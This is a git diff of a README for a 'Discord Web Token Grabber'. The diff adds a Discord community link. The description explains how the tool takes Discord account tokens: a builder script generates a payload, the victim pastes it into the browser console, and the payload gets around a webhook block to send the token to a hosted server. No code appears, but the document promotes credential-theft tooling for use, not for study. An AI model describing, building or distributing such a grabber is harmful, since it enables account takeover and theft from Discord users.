@@ -1,6 +1,9 @@
 # Discord Web Token Grabber Version 1.2
 A tool for grabbing Discord tokens using a redirect bypass technique.
 
+## discord
+- https://dsc.gg/project-asura
+
 ## Description
 This tool consists of a JavaScript/Python script that allows you to grab Discord tokens by bypassing the block on requests to webhooks. It works by uploading the server.py script to a hosting service and using the builder.py script to generate a payload that can be pasted into the browser console while Discord is open in the tab. The token will then be sent to the specified webhook.
 
